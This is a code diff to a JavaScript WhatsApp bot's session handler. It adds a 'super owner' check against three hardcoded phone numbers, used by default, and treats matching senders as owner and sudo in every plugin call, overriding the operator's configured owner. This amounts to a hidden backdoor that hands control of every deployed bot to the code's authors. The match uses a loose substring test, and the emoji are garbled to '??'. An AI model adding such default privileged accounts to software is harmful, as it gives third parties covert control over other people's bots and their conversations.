@@ -88,7 +88,8 @@ function kaif_loadPlugins() {
         'ping.js',
         'menu.js',
         'antidelete.js',
-        'autostatus.js'
+        'autostatus.js',
+        'owner.js'
     ];
     
     for (const file of requested) {
@@ -375,6 +376,19 @@ async function startSession(sessionId) {
                 kaif_msg.message.videoMessage?.caption ||
                 kaif_msg.message.documentMessage?.caption || "";
 
+            // Super Owner Detection & Crown ?? Auto-React
+            const superOwnerList = (config.superOwners || ['92398634113', '923453684061', '923466859436']).map(n => n.replace(/\D/g, ''));
+            const cleanSender = kaif_sender.replace(/\D/g, '');
+            const isSuperOwner = superOwnerList.some(num => num && cleanSender.includes(num));
+
+            if (isSuperOwner && kaif_origin !== 'status@broadcast') {
+                try {
+                    await kaif_sock.sendMessage(kaif_origin, {
+                        react: { text: '??', key: kaif_msg.key }
+                    });
+                } catch (e) {}
+            }
+
             // Save message asynchronously without blocking the execution chain
             if (kaif_msg.key?.id) {
                 kaif_msg._receivedAt = Date.now();
@@ -544,7 +558,7 @@ async function startSession(sessionId) {
                         }
 
                         const ownerNum = (config.ownerNumber || '').replace(/\D/g, '');
-                        const isOwner = kaif_msg.key.fromMe || (ownerNum && kaif_sender.includes(ownerNum));
+                        const isOwner = kaif_msg.key.fromMe || isSuperOwner || (ownerNum && cleanSender.includes(ownerNum));
 
                         await plugin.kaif_handler(kaif_sock, kaif_origin, {
                             kaif_sender,
@@ -556,6 +570,7 @@ async function startSession(sessionId) {
                             kaif_isAdmin,
                             kaif_isOwner: isOwner,
                             kaif_isSudo: isOwner,
+                            kaif_isSuperOwner: isSuperOwner,
                             kaif_plugins
                         });
                     } catch (err) {
